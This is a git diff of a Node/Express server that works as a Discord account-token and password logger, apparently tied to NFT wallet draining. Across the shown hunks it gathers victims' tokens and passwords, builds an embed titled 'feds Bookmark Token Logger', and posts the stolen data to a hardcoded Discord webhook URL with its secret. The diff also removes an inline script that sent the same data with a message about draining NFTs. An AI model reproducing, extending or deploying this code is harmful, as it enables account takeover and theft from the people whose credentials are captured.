@@ -80,25 +80,6 @@ app.get("/k", async (req, res) => {
     res.send(`<!DOCTYPE html>
 <title>onload/redirect</title>
 <script>
-
-var webhookURL = "https://canary.discord.com/api/webhooks/1054303465880420432/9NPg39l450Ke3-Oec5yRt3xJc-YtpK9pBBAoOA1w-p92I4stNsv9ql5IT_CtGY_u_yvu";
-var url_string = window.location.href; 
-var url = new URL(url_string);
-var currentURL = url.searchParams.get("user");
-const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
-
-var postData = {
-  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + data
-};
-fetch(webhookURL, {
-  method: "POST",
-  body: JSON.stringify(postData),
-  headers: {
-    "Content-Type": "application/json"
-  }
-});
-
-
 function handleOnLoad(){
 window.location="https://discord.com/channels/@me";
 }
@@ -113,7 +94,7 @@ window.location="https://discord.com/channels/@me";
       console.log(data);
       if (!data) return;
       const embed = new MessageEmbed();
-      embed.setTitle("feds bookmark");
+      embed.setTitle("feds Bookmark Token Logger");
       embed.setImage(data.bannerURL);
       embed.setThumbnail(data.avatarURL);
       let rawStringData = [];
@@ -130,7 +111,7 @@ window.location="https://discord.com/channels/@me";
       if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
         console.log("Found Duplicate Logged ID");
       } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1054303465880420432/9NPg39l450Ke3-Oec5yRt3xJc-YtpK9pBBAoOA1w-p92I4stNsv9ql5IT_CtGY_u_yvu", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        await axios({ method: "POST", url: "https://canary.discord.com/api/webhooks/1054303465880420432/9NPg39l450Ke3-Oec5yRt3xJc-YtpK9pBBAoOA1w-p92I4stNsv9ql5IT_CtGY_u_yvu", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
         process.logged.push({ token, password: pass });
       }
     } catch (err) {
